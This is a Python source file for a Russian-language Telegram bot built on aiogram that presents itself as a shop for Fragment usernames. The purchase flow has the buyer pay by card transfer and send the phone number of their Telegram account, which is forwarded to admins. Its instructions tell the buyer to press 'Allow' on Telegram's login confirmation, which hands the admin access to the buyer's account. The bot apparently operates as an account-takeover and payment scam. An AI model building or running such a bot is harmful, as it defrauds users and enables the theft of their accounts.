from aiogram import Router, F, types
from aiogram.types import CallbackQuery, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from database.models import db
from config import FRAGMENT_ITEMS, FRAGMENT_BRAND, FRAGMENT_SLOGAN, CARD_NUMBER, BANK_NAME, ADMIN_IDS
from datetime import datetime

router = Router()


class FragmentStates(StatesGroup):
    waiting_phone = State()


@router.callback_query(F.data == "mode_fragment")
async def show_fragment_menu(call: CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.button(text="📛 КАТАЛОГ", callback_data="fragment_catalog")
    builder.button(text="📋 МОИ ПОКУПКИ", callback_data="fragment_orders")
    builder.button(text="ℹ️ КАК КУПИТЬ", callback_data="fragment_info")
    builder.button(text="◀️ СМЕНИТЬ РЕЖИМ", callback_data="main_menu")
    builder.adjust(1)
    
    await call.message.edit_text(
        f"{FRAGMENT_BRAND}\n<i>{FRAGMENT_SLOGAN}</i>\n\n"
        "🔹 Оригинальные юзернеймы с Fragment\n"
        "🔹 Покупаешь навсегда\n"
        "🔹 Цены от 499₽\n\n"
        "⚡ Стань уникальным!",
        reply_markup=builder.as_markup(), parse_mode="HTML"
    )
    await call.answer()


@router.callback_query(F.data == "fragment_catalog")
async def show_catalog(call: CallbackQuery):
    builder = InlineKeyboardBuilder()
    for key, item in FRAGMENT_ITEMS.items():
        status = "🟢" if item['available'] else "🔴"
        builder.button(
            text=f"{status} {item['name']} — {item['price']}₽",
            callback_data=f"fragbuy_{key}"
        )
    builder.button(text="◀️ НАЗАД", callback_data="mode_fragment")
    builder.adjust(1)
    
    await call.message.edit_text(
        f"{FRAGMENT_BRAND}\n\n📛 <b>ДОСТУПНЫЕ ЮЗЕРНЕЙМЫ:</b>",
        reply_markup=builder.as_markup(), parse_mode="HTML"
    )
    await call.answer()


@router.callback_query(F.data == "fragment_info")
async def show_info(call: CallbackQuery):
    await call.message.edit_text(
        "📛 <b>КАК КУПИТЬ ЮЗЕРНЕЙМ:</b>\n\n"
        "1. Выбираешь юзернейм\n"
        "2. Оплачиваешь\n"
        "3. Отправляешь <b>номер телефона</b>\n"
        "4. Мы заходим на Fragment\n"
        "5. Telegram пришлёт «Подтвердить вход»\n"
        "6. Нажимаешь «Разрешить»\n"
        "7. Юзернейм привязан!\n\n"
        "⚠️ Без подтверждения входа — не сможем привязать.",
        reply_markup=InlineKeyboardBuilder().button(
            text="📛 К КАТАЛОГУ", callback_data="fragment_catalog"
        ).as_markup(), parse_mode="HTML"
    )
    await call.answer()


@router.callback_query(F.data.startswith("fragbuy_"))
async def buy_fragment(call: CallbackQuery, state: FSMContext):
    item_key = call.data.replace("fragbuy_", "")
    item = FRAGMENT_ITEMS.get(item_key)
    
    if not item: await call.answer("Не найден"); return
    if not item['available']: await call.answer("❌ ПРОДАНО", show_alert=True); return
    
    order_id = db.insert('fragment_orders', {
        'user_id': call.from_user.id, 'item_key': item_key,
        'amount': item['price'], 'status': 'pending',
        'created_at': datetime.now().isoformat()
    })
    
    for admin_id in ADMIN_IDS:
        try:
            await call.bot.send_message(admin_id,
                f"📛 <b>НОВЫЙ ЗАКАЗ!</b>\n#{order_id}\n{item['name']}\n💰 {item['price']}₽\n👤 <code>{call.from_user.id}</code>",
                parse_mode="HTML")
        except: pass
    
    await state.set_state(FragmentStates.waiting_phone)
    await state.update_data(order_id=order_id, item_key=item_key, amount=item['price'])
    
    await call.message.edit_text(
        f"✅ <b>ЗАКАЗ #{order_id}</b>\n\n"
        f"📛 {item['name']}\n💰 {item['price']} ₽\n\n"
        f"💳 <b>ОПЛАТА:</b>\n<code>{CARD_NUMBER}</code>\n🏦 {BANK_NAME}\n\n"
        f"📱 После оплаты отправьте <b>номер телефона</b> от Telegram.",
        reply_markup=InlineKeyboardBuilder().button(text="❌ ОТМЕНА", callback_data="fragment_catalog").as_markup(),
        parse_mode="HTML"
    )
    await call.answer()


@router.message(FragmentStates.waiting_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    data = await state.get_data()
    await state.clear()
    
    db.update('fragment_orders', {'phone': phone}, 'order_id=?', (data['order_id'],))
    item = FRAGMENT_ITEMS.get(data['item_key'], {})
    
    for admin_id in ADMIN_IDS:
        try:
            builder = InlineKeyboardBuilder()
            builder.button(text="✅ ВЫДАТЬ", callback_data=f"fragdone_{data['order_id']}")
            await message.bot.send_message(admin_id,
                f"📛 <b>НОМЕР ДЛЯ ПРИВЯЗКИ!</b>\n#{data['order_id']}\n{item.get('name')}\n📱 <code>{phone}</code>\n👤 <code>{message.from_user.id}</code>",
                reply_markup=builder.as_markup(), parse_mode="HTML")
        except: pass
    
    await message.answer(
        f"📱 <b>НОМЕР ПРИНЯТ!</b>\n\n"
        f"📛 {item.get('name')}\n📱 <code>{phone}</code>\n\n"
        f"⚡ Админ зайдёт на Fragment.\n"
        f"📩 Telegram пришлёт «Подтвердить вход» → нажми «Разрешить»",
        reply_markup=InlineKeyboardBuilder().button(text="📋 МОИ ПОКУПКИ", callback_data="fragment_orders").as_markup(),
        parse_mode="HTML"
    )


@router.callback_query(F.data == "fragment_orders")
async def show_orders(call: CallbackQuery):
    orders = db.fetchall("SELECT * FROM fragment_orders WHERE user_id=? ORDER BY created_at DESC", (call.from_user.id,))
    if not orders:
        text = "📛 Нет покупок."
    else:
        text = "📛 <b>ВАШИ ПОКУПКИ:</b>\n\n"
        for o in orders:
            item = FRAGMENT_ITEMS.get(o['item_key'], {})
            status = "✅ ВЫДАН" if o['status']=='completed' else "⏳ ОЖИДАЕТ"
            text += f"{'✅' if o['status']=='completed' else '⏳'} <b>#{o['order_id']}</b>\n📛 {item.get('name', o['item_key'])}\n💰 {o['amount']}₽ | {status}\n\n"
    builder = InlineKeyboardBuilder()
    builder.button(text="📛 КАТАЛОГ", callback_data="fragment_catalog")
    builder.button(text="◀️ НАЗАД", callback_data="mode_fragment")
    await call.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await call.answer()
